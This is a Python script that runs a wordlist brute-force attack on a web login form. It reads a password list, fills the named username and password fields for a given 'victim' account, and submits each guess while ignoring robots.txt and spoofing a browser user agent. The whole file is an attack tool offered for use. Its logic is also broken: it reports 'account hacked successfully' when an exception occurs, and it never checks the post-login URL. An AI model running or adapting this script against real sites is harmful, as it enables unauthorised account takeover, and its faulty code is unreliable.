import mechanize
import cookielib
import cookielib
import sys
import argparse
import time
from random import randint
                                               
example ='''
-u & --url          | put the loggin url               |  ex:"example.com/login" 
-uI & --usernameId  | put the html username id         |  ex:"user"
-us & --username    | put the username of the victim   |  ex:"user_01"
-pI & --passwordId  | put thhtml password id           |  ex:"pass"
-w & --wordlistfile | the wordlist path                |  ex:"root/wordlist.txt"
-t & --urltitle     | the url after the login to check |  ex:"example.com/home '''
 

arparser = argparse.ArgumentParser(description='wordlist attack')


arparser.add_argument(
    "-u", "--url", required=False, help="URL to attack"
)

arparser.add_argument(
    "-uI", "--usernameId", required=False, help="the html username id"
)

arparser.add_argument(
    "-us", "--username", required=False, help="username of the victim"
)

arparser.add_argument(
    "-pI", "--passwordId", required=False, help="the html password id"
)

arparser.add_argument(
    "-w", "--wordlistfile", required=False, help="the word list file location"
)


arparser.add_argument(
    "-t", "--urltitle", required=False, help="the title of the url after attack"
)

parser = vars(arparser.parse_args())


login = parser["url"]
user_html_input = parser["usernameId"]
user = parser["username"]
html_pass_input = parser["passwordId"]
password = parser["wordlistfile"]
after_request_url = parser["urltitle"]

if login is None :
	print example
	sys.exit()



password = open(password, 'r') 
password = password.readlines()
print '[+] passwords to try : %s ' % len(password) # create an empty list to store the lines in the file

 # print out the 1st and last word of each line

br = mechanize.Browser()

# Browser Configurations
cj=cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) 

# User Agent
useragents = ('Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0' ,)


print "[+] attacking: {}" .format(user)

# Add User Agent In Header

br.addheaders = [('User-agent', useragents)]

print "attack started ..."

# Try To Get Login Page
start_time = time.time()

for pwd in password :
    def main():
        print 'Time elapsed: ' + str(time.time() - start_time)
        print 'account hacked successfully'
    try:
    	site = br.open(login)

       
# Select Form By Index
        br.select_form(nr=0)

# Enter Username
        br.form[user_html_input] = user

# Enter Password
        br.form[html_pass_input] = pwd



# Now Submit
        br.submit()
       

# Get Url
        log=br.geturl()

    except Exception :
    	main()
    	sys.exit()



# Check Login Page Url
    
       #sys.stdout.write("trying : %s" % pwd)    

           
           

    sys.stdout.write("trying : %s" % pwd )
    sys.stdout.flush()
